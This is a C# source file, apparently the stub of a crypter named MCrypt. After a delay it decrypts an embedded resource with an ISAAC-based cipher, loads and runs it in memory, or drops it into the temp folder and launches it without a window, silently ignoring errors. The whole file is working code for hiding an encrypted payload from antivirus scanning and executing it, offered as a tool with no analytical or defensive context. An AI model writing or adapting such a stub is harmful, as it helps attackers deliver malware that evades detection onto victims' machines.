using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace MCrypt.Stub
{
    public class StubFile
    {
        public static void Main(string[] args)
        {
            var decryptionGuid = Fields.DECRYPTION_GUID;
            var resourceNames = new string[] { Fields.RESOURCE_NAME };
            var secondsDelay = Fields.SECONDS_DELAY;

            var assembly = Assembly.GetEntryAssembly();

            Thread.Sleep(TimeSpan.FromSeconds(secondsDelay));

            foreach (var resourceName in resourceNames)
            {
                var resourceStream = assembly.GetManifestResourceStream(assembly.GetName().Name + "." + resourceName);

                var fileBytes = ReadFully(resourceStream);

                var cipher = new IsaacRandom(decryptionGuid);
                for (int i = 0; i < fileBytes.Length; i++)
                {
                    fileBytes[i] -= cipher.NextByte();
                }
                
                try
                {
                    if (resourceName.EndsWith(".exe"))
                    {
                        var asm = Assembly.Load(fileBytes);
                        asm.EntryPoint.Invoke(null, new string[0]);
                        return;
                    }
                }
                catch (Exception) { }

                try
                {
                    var outPath = Path.Combine(Path.GetTempPath(), resourceName);
                    File.WriteAllBytes(outPath, fileBytes);
                    Process p = new Process();
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = true;
                    p.StartInfo.FileName = outPath;
                    p.Start();
                }
                catch (Exception) { }
            }
        }

        public static byte[] ReadFully(Stream input)
        {
            byte[] buffer = new byte[16 * 1024];
            using (MemoryStream ms = new MemoryStream())
            {
                int read;
                while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ms.Write(buffer, 0, read);
                }
                return ms.ToArray();
            }
        }
    }
}
